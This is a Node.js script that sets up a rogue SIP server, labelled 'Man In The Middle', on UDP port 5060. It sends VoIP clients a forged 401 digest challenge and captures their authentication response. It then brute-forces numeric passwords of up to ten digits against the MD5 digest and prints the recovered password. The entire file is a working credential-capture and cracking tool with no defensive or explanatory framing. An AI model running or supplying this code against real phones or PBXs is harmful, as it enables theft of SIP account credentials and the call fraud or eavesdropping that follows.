const { createHash } = require('crypto'), { createSocket } = require('dgram');
let tryPassword = (algorithm = 'md5', username, trypass, realm, nonce, hash, uri) => {
    let enc = (d) => createHash(algorithm).update(d).digest('hex'),
        ha2 = enc(`REGISTER:${uri}`),
        ha1 = enc(`${username}:${realm}:${trypass}`),
        res = enc(`${ha1}:${nonce}:${ha2}`);
    if (res == hash) {
        return true;
    }
    return false;
},
    parseauth = (authheader) => {
        let p = (h) => h.split('=')
        let pa = authheader.split(' ').slice(1).join('').trim().split(',')
        let f = {}
        for (field of pa) {
            let i = p(field)
            f[i[0]] = i[1].replace(/\"/g, '')
        }
        return f;
    },
    rstring = () => Math.floor(Math.random() * 1e6).toString(),
    PORT = 5060, HOST = '0.0.0.0',
    server = createSocket({
        type: 'udp4',
        reuseAddr: true,
    });
server.on('listening', () => {
    var address = server.address();
    console.log(`Man In The Middle SIP server running at ${address.address}:${address.port}`);
});
server.on('message', (message, remote) => {
    message = `${message}`;
    let CRLF = '\r\n', lines = message.split(CRLF), headers = [], [method, sipaddr, protocol] = lines[0].split(' ');
    for (let line of lines.slice(1)) {
        let name, value, splitted_result = line.match(/^(.*?):\s*(.*)/);
        if (!splitted_result) continue;
        [, name, value] = splitted_result;
        if (!name) continue;
        headers[name] = value;
    }
    console.log(`client message from address ${remote.address}:${remote.port}`);
    if (headers['Authorization']) {
        let { algorithm, username, realm, nonce, response, uri } = parseauth(headers['Authorization'])
        let addz = (n) => {
            let len = ('' + n).match(/\d+/)?.[0]?.length || 0
            ++n;
            return ('' + n).padStart(len, 0)
        }
        let gen = (s) => {
            l = ('' + s).length;
            if (s == '9'.repeat(l)) {
                return '0'.repeat(l + 1)
            } else {
                return addz('' + s)
            }
        }
        let pass = '-1';
        do {
            pass = gen(pass);
            if (tryPassword(algorithm, username, pass, realm, nonce, response, uri)) {
                console.log(`uri: ${uri} username: ${username} found password: ${pass}`)
                process.exit();
            }
        } while (pass.length < 10)
        return console.error('cannot find the password') && process.exit(1)
    }

    console.log('negotiating..');
    server.send([
        'SIP/2.0 401 Unauthorized',
        `Via: ${headers['Via']}`,
        `To: ${headers['To']};tag=maninthemiddle`,
        `From: ${headers['From']}`,
        `Call-ID: ${headers['Call-ID']}`,
        `CSeq: ${headers['CSeq']}`,
        `WWW-Authenticate: Digest realm="maninthemiddle",nonce="${rstring()}",algorithm=md5`,
        'Content-Length: 0',
    ].join(CRLF) + CRLF + CRLF, remote.port, remote.address);
});

server.bind(PORT, HOST);
